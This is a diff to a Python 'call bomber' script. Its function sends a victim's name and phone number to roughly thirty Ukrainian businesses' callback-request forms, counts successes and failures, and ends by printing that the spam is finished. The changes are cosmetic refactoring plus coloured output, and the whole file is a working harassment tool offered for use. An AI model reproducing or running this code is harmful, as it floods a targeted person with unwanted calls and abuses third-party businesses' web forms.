@@ -3,6 +3,7 @@ import time
 import secrets
 from datetime import datetime
 import random
+from colorama import Fore
 
 
 def random_token():
@@ -10,26 +11,10 @@ def random_token():
     return token
 
 
-def send_requests_call(name, phone_num, delay, name_o):
+def send_requests_call(name, phone_num, name_o, delay):
     done = 0
     fail = 0
 
-    # 1 request
-    try:
-        requests.post('http://smart-lift.com.ua/1.php',
-                      data={
-                          'txtname': name,
-                          'txtphone': phone_num,
-                          'valTrFal': 'valTrFal_true'
-                      })
-        done = done + 1
-        print('Запрос на звонок успешно отпрвлен')
-    except:
-        fail = fail + 1
-        print('Запрос не удался!')
-    time.sleep(delay)
-
-    # 2 request
     try:
         requests.post('https://junker.kiev.ua/postmaster.php',
                       data={
@@ -37,11 +22,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'tel': phone_num,
                           'action': 'callme'
                       })
-        done = done + 1
-        print('Запрос на звонок успешно отпрвлен')
+        done += 1
+        print(Fore.GREEN + 'Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 3 request
@@ -53,11 +38,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'this_page_url': 'https://mobileplanet.ua/telefony-349',
                           'object': 'callback'
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 4 request
@@ -68,11 +53,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'name': name,
                           'phone': phone_num
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 5 request
@@ -84,11 +69,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'form[yurfirma_submit': '',
                           'form[formId]': '3'
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 6 request
@@ -101,11 +86,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'capch': '4',
                           'mod': '1'
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 7 request
@@ -115,11 +100,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'name': name,
                           'phone': phone_num
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 8 request
@@ -130,11 +115,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'crm_models_SupportRequest[user_phone]': '+' + phone_num,
                           'crm_models_SupportRequest[link]': 'https://doc.ua/doctors/kiev/all/psiholog'
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 9 request
@@ -145,11 +130,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[telephone]': phone_num,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 10 request
@@ -165,11 +150,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 11 request
@@ -185,11 +170,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 12 request
@@ -205,11 +190,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 13 request
@@ -225,11 +210,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 14 request
@@ -245,11 +230,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 15 request
@@ -265,11 +250,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 16 request
@@ -285,11 +270,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 17 request
@@ -305,11 +290,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 18 request
@@ -325,11 +310,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 19 request
@@ -345,11 +330,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 20 request
@@ -365,11 +350,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 21 request
@@ -385,11 +370,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     # 22 request
@@ -405,11 +390,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  23 request
@@ -425,11 +410,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  24 request
@@ -445,11 +430,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  25 request
@@ -465,11 +450,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  26 request
@@ -485,11 +470,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  27 request
@@ -505,11 +490,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  28 request
@@ -525,11 +510,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  29 request
@@ -545,11 +530,11 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
     time.sleep(delay)
 
     #  30 request
@@ -565,9 +550,10 @@ def send_requests_call(name, phone_num, delay, name_o):
                           'callback[timer]': time_call,
                           'callback[description]': ''
                       })
-        done = done + 1
+        done += 1
         print('Запрос на звонок успешно отпрвлен!')
     except:
-        fail = fail + 1
-        print('Запрос не удался!')
-    time.sleep(delay)
+        fail += 1
+        print(Fore.RED + 'Запрос не удался!')
+
+    print(Fore.GREEN + f"Спам завершился!\nУспешно: {done}.\nНеуспешно: {fail}")
